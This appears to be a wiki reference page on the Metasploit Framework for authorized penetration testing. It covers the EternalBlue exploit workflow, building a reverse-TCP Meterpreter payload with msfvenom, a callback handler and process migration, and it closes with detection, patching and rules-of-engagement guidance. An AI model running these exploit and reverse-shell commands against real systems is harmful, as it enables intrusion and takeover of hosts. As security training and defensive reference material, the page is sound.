# Metasploit Framework Reference

Metasploit is an exploitation and post-exploitation framework used by penetration testers and red teams. It bundles exploit modules, payloads, encoders, and auxiliary scanners behind the `msfconsole` interface. Use it only against lab systems or targets covered by a signed rules-of-engagement document. This page covers the authorized testing workflow and the controls that detect and stop the activity.

## What it is and where it runs

Metasploit runs on Linux (Kali, Parrot) and other Unix-like hosts, and on Windows. The main entry point is `msfconsole`, an interactive console backed by a PostgreSQL database for storing hosts, services, and loot. Supporting command-line tools include `msfvenom` for payload generation and `msfdb` for database control. Operators drive it from an attack box that has network reach to the authorized scope.

Start the database and the console:

```
sudo msfdb init
msfconsole -q
```

## Core commands

Organize an engagement with a workspace so hosts and loot stay separated per client.

```
workspace -a client-lab
workspace client-lab
```

Find a module, select it, and read its documentation before running anything.

```
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
info
```

Review and set options. `set` applies to the current module; `setg` applies globally across modules in the session.

```
show options
set RHOSTS 10.10.10.5
setg LHOST 10.10.14.2
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Run the module. `check` tests whether a target looks vulnerable without exploiting it.

```
check
run
exploit
```

Manage shells and Meterpreter sessions.

```
sessions -l
sessions -i 1
background
```

| Command | Purpose |
| --- | --- |
| `search` | Find modules by type, platform, CVE, name |
| `use` | Load a module into the console |
| `info` | Show module description, options, references |
| `show options` | List required and optional settings |
| `set` / `setg` | Set a module option / a global option |
| `run` / `exploit` | Execute the loaded module |
| `check` | Probe for the vulnerability without exploiting |
| `sessions` | List and interact with open sessions |
| `background` | Return a session to the console |
| `db_nmap` | Run `nmap` and store results in the workspace |

Meterpreter is the in-memory payload for interactive post-exploitation. On an authorized host, the common first commands confirm context and surroundings.

```
sysinfo
getuid
ps
migrate 1840
```

`sysinfo` prints the target OS. `getuid` shows the current account. `ps` lists processes. `migrate` moves the payload into another process, at a high level to keep access tied to a longer-lived process during a sanctioned test.

Scan and record hosts directly into the database with `db_nmap`.

```
db_nmap -sV -p- 10.10.10.0/24
hosts
services
```

Resource scripts replay a saved sequence of console commands, which keeps engagements repeatable and auditable.

```
makerc /tmp/recon.rc
resource /tmp/recon.rc
```

`msfvenom` generates standalone payloads for authorized tests, for example a listener callback used in a sanctioned phishing simulation. Keep payloads inside the engagement scope and delete them at the end.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o /tmp/test.exe
```

## Common workflows

Service discovery into the database, then a targeted search.

```
workspace -a acme-internal
db_nmap -sV -p 445,3389 10.10.10.0/24
services -p 445
search cve:2017 name:eternalblue
```

Validate a known-vulnerable lab box end to end.

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
setg LHOST 10.10.14.2
check
run
sessions -i 1
```

Catch a callback from a payload generated for a sanctioned social-engineering test.

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
setg LHOST 10.10.14.2
set LPORT 4444
run -j
```

Confirm context on a compromised lab host, then step back.

```
sessions -i 1
sysinfo
getuid
background
```

## Flags and options worth knowing

| Option or flag | Meaning |
| --- | --- |
| `RHOSTS` | Target host or range |
| `RPORT` | Target port |
| `LHOST` | Listener address on the attack box |
| `LPORT` | Listener port |
| `PAYLOAD` | Code delivered on success |
| `-j` (on `run`) | Run the module as a background job |
| `-q` (on `msfconsole`) | Start without the banner |
| `-p` (on `msfvenom`) | Payload to build |
| `-f` (on `msfvenom`) | Output format, such as `exe`, `elf`, `raw` |
| `-e` (on `msfvenom`) | Encoder to apply |

## Detection and defense

Endpoint detection and response (EDR) tools carry signatures and behavioral rules for Meterpreter, common reflective loaders, and process migration. Default `msfvenom` output and unencoded payloads are well-signatured, so defenders should expect EDR to flag them on write and on execution. Network detection platforms and intrusion detection systems identify default stager traffic, common reverse_tcp patterns, and known handler behavior; TLS inspection and JA3/JA4 fingerprinting add coverage.

The durable fix is to patch the exploited weakness. EternalBlue abused a memory corruption flaw (CWE-787, out-of-bounds write); other modules target injection (CWE-78, CWE-89), deserialization (CWE-502), or missing authentication (CWE-306). Remove the root cause, segment management services, and restrict SMB and RDP exposure. Monitor for new processes spawned by service accounts and for unexpected outbound connections from servers. Follow the input-validation and least-privilege guidance in /SECURE_CODING_REFERENCE.md when hardening the application tier.

Authorized scope is a control, not paperwork. A rules-of-engagement document names the in-scope hosts, the test window, the allowed techniques, and the emergency contacts. It keeps the test legal, bounds blast radius, and gives the defending team a baseline to distinguish the test from a real intrusion. Do not run a module against anything outside that written scope.

## Resources

- Metasploit Framework official documentation and module reference
- Rapid7 Metasploit user guide
- "Metasploit: The Penetration Tester's Guide" by Kennedy, O'Gorman, Kearns, and Aharoni

## Related pages

- /commands/README.md
- /SECURE_CODING_REFERENCE.md
- /commands/nmap.md
- /commands/sqlmap.md
- /commands/hashcat.md
